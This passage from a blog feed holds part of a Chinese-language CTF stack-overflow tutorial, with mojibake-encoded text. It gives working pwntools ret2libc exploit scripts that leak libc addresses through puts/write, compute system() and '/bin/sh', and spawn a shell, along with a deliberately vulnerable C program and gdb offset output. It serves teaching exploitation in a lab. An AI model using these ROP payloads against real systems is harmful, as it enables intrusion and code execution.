class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure><p>ä¸‡äº‹å…·å¤‡æˆ‘ä»¬å°±ç›´æ¥æ„é€ EXPå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">&#x27;6666&#x27;</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿è¡Œæµç¨‹</span></span><br><span class="line">PUSH å‚æ•°-&gt;PUSH è¿”å›åœ°å€-&gt;JMP systemå‡½æ•°åœ°å€-&gt;PUSH å‚æ•°ï¼ˆè¿›å…¥CALLè°ƒç”¨æ ˆä¸­ï¼‰-&gt;POP å‚æ•°(ç”±äºä¸ºäº†å †æ ˆå¹³è¡¡ä¹‹å‰PUSHäº†å‚æ•°)-&gt;CALL getså‡½æ•°</span><br><span class="line"><span class="comment">#ä¼ªC++ä»£ç ç±»ä¼¼ä¸‹é¢</span></span><br><span class="line">system(gets(*buf2))</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/18.png" alt="image-20201120190619022"></p><p>å…³äºæ ˆçš„åˆ†å¸ƒå›¾</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/19.png" alt="19"></p><hr><h4 id="æ— system-å‡½æ•°å’Œ-bin-shå­—ç¬¦ä¸²"><a href="#æ— system-å‡½æ•°å’Œ-bin-shå­—ç¬¦ä¸²" class="headerlink" title="æ— system()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²"></a>æ— system()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²</h4><p>é¦–å…ˆæŸ¥çœ‹ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ./ret2libc3</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ˜¯åŠ è½½<strong>libc.so</strong>åŠ¨æ€é“¾æ¥åº“çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd2100</span>  <span class="number">0xf7fef7f3</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7de81d0</span>  <span class="number">0xf7f4171a</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ²¡æœ‰<code>system()</code>å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/20.png" alt="image-20201121103715703"></p><p>ç”±äºä»–åŠ è½½äº†<strong>libc.so</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ˜ç¡®å‡ ç‚¹</p><ul><li><p>åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„</p></li><li><p>A çœŸå®åœ°å€ (å†…å­˜ç‰©ç†åœ°å€) - A åç§»åœ°å€ = B çœŸå®åœ°å€ (å†…å­˜ç‰©ç†åœ°å€) -B åç§»åœ°å€ = åŸºåœ°å€</p></li><li><p>å¦‚æœæˆ‘ä»¬çŸ¥é“<strong>libc.so</strong>ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¯¥ç¨‹åºåˆ©ç”¨çš„<strong>libc.so</strong>ã€‚è¿›è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“<code>system()</code>å‡½æ•°çš„åœ°å€ã€‚é€šè¿‡<code>puts()</code>æ³„éœ²æŸä¸ªå·²æ‰§è¡Œè¿‡çš„å‡½æ•°çš„GOTåœ°å€ï¼Œå¹¶ä¸”è¿”å›åœ°å€è®¾ç½®ä¸º_start()æˆ–main()ï¼Œä»¥ä¾¿äºé‡æ–°æ‰§è¡Œä¸€éç¨‹åºï¼›</p></li></ul><p>ç®€å•åœ°è¯´ï¼Œmain()å‡½æ•°æ˜¯ç”¨æˆ·ä»£ç çš„å…¥å£ï¼Œæ˜¯å¯¹ç”¨æˆ·è€Œè¨€çš„ï¼›è€Œ_start()å‡½æ•°æ˜¯ç³»ç»Ÿä»£ç çš„å…¥å£ï¼Œæ˜¯ç¨‹åºçœŸæ­£çš„å…¥å£ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹æœ¬é¢˜çš„_start()å‡½æ•°å†…å®¹ï¼Œå…¶åŒ…å«main()å’Œ__libc_start_main()å‡½æ•°çš„è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæ‰æ˜¯ç¨‹åºçœŸæ­£çš„å…¥å£</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/22.png" alt="img"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¼–å†™EXPäº†ï¼Œè¿™ä¸ªEXPå°±ç®—å¼€å¯äº†ASLRçš„è¯éƒ½æ˜¯ç‹‚é‡åˆ©ç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™è¾¹ç»•è¿‡äº†<strong>NX</strong>ä¿æŠ¤å’Œ<strong>ASLR</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts plt: &quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts got: &quot;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]_start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got])<span class="comment">#æŠŠputs_gotåœ°å€æ”¾åˆ°æ ˆä¸­å‚æ•°ä½ç½®</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))<span class="comment">#è·å–åˆ°è¾“å‡ºçš„å€¼ï¼Œé‡Œé¢å¸¦æœ‰æˆ‘ä»¬æ”¾å…¥çš„puts_gotåœ°å€</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak puts addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#è·å–ç›¸å¯¹åç§»</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]system addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]binsh addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload2 to getshell...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">&quot;B&quot;</span> * <span class="number">112</span>, system_addr, <span class="string">&quot;CCCC&quot;</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/23.png" alt="image-20201121164703334"></p><blockquote><h2 id="ç»•è¿‡ASLRä¿æŠ¤"><a href="#ç»•è¿‡ASLRä¿æŠ¤" class="headerlink" title="ç»•è¿‡ASLRä¿æŠ¤"></a>ç»•è¿‡ASLRä¿æŠ¤</h2></blockquote><p>æµ‹è¯•ä»£ç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">vuln_func();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -z noexecstack -no-pie test.c -o test.out</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ£€æŸ¥é¢˜ç›®çš„ä¿æŠ¤å’Œæ˜¯å¦å¼€å¯äº†ASLRä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7f71000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7da0000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f73000)</span><br><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7fba000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7de9000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure><p>è¿è¡Œçš„æ—¶å€™æŸ¥çœ‹ä¸‹åŠ è½½äº†ä»€ä¹ˆåŠ¨æ€é“¾æ¥åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0xf7fd9860  0xf7ff28dd  Yes (*)     /lib/ld-linux.so.2</span><br><span class="line">0xf7e1d750  0xf7f4696d  Yes (*)     /lib32/libc.so.6</span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„æ€è·¯ï¼šç”±äºç¨‹åºæœªå¼€å¯PIEï¼Œå¯¼è‡´ç¨‹åºæœ¬èº«çš„åœ°å€æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡write()å‡½æ•°è¿›è¡Œä¿¡æ¯æ³„éœ²ï¼Œæ‰“å°å‡ºlibcçš„åœ°å€ï¼Œè¿›è€Œè®¡ç®—system()çš„åœ°å€</p><p>EXPå°±åˆ†ä¸ºä¸¤ä¸ªæµç¨‹ï¼š</p><ul><li>é€šè¿‡payloadåœ¨vuln_funcä¸­è¿›è¡Œæ ˆæº¢å‡ºï¼Œè°ƒç”¨write@plt æ‰“å°å‡ºwrite@gotï¼Œå®Œæˆååˆè¿”å›åˆ°vuln_funcä¸­</li><li>é€šè¿‡å†æ¬¡æº¢å‡ºè°ƒç”¨è®¡ç®—å‡ºç›¸å¯¹åœ°å€çš„systemå‡½æ•°è·å¾—shell</li></ul><p>é¦–å…ˆæŸ¥çœ‹æº¢å‡ºä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  pattern create 200</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;</span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: &#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn&#x2F;test.out </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xc9 </span><br><span class="line">EBX: 0x6c414150 (&#39;PAAl&#39;)</span><br><span class="line">ECX: 0xffffcd80 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)</span><br><span class="line">EDX: 0x100 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EBP: 0x41514141 (&#39;AAQA&#39;)</span><br><span class="line">ESP: 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">EIP: 0x41416d41 (&#39;AmAA&#39;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41416d41</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0004| 0xffffce14 (&quot;AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0008| 0xffffce18 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0012| 0xffffce1c (&quot;TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0016| 0xffffce20 (&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0020| 0xffffce24 (&quot;ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0024| 0xffffce28 (&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0028| 0xffffce2c (&quot;AAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41416d41 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41416d41</span><br><span class="line">1094806849 found at offset: 140</span><br></pre></td></tr></table></figure><div class="note info modern"><p>1.ç”±äºå’Œé¢˜ç›®ret2libc3ä¸ä¸€æ ·ï¼Œæº¢å‡ºå‡½æ•°ä¸æ˜¯åœ¨main()ä¸­è€Œæ˜¯åœ¨vuln_func_addr()ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è·å–vuln_func_addr()å‡½æ•°çš„åœ°å€æ¥ä½œä¸ºè¿”å›åœ°å€</p><p>2.è¦åˆ©ç”¨ä»€ä¹ˆå‡½æ•°å°±éœ€è¦æ ¹æ®å‡½æ•°çš„å…·ä½“å‚æ•°æ¥æ„é€ æ ˆï¼Œæ¯”å¦‚åˆ©ç”¨<code>write(STDOUT_FILENO, &quot;Hello world!\n&quot;, 13)</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ ˆçš„æ„é€ å°±éœ€è¦<code>write(1,address,4)</code>æ¥ä¼ é€’å‚æ•°</p></div><p>ç¼–å†™EXPï¼Œè¿è¡Œç¯å¢ƒUbuntu 16.04 Python3.8 ï¼ˆUbuntu20.04 Python3.8æ— æ³•è¿è¡Œï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coidng: utf-8 -*-</span></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">write_plt=elf.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#elf.plt[&#x27;write&#x27;]</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_func_addr = elf.symbols[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span> * <span class="number">140</span>).encode()+ p32(write_plt)+p32(vuln_func_addr)+p32(<span class="number">1</span> )+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#&quot;A&quot; * 140æ˜¯æº¢å‡ºéœ€è¦çš„å­—èŠ‚</span></span><br><span class="line"><span class="comment">#write(1,address,4)è¡¨ç¤ºå°†addresså‘å¤–å†™</span></span><br><span class="line">print(payload1)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#è·å–ç›¸å¯¹åç§»</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/26.png" alt="image-20210325200443317"></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;c90530c910b0</span><br><span class="line">https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2019&#x2F;03&#x2F;05&#x2F;%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc</span><br><span class="line">ã€Šctfç«èµ›æƒå¨æŒ‡å—ï¼ˆPWNç¯‡ï¼‰ã€‹</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linuxæ ˆæº¢å‡ºæ€»ç»“ï¼ˆ0x01ï¼‰</title>
    <link href="https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/"/>
    <id>https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/</id>
    <published>2020-11-19T10:45:42.000Z</published>
    <updated>2021-05-17T02:09:49.634Z</updated>
    
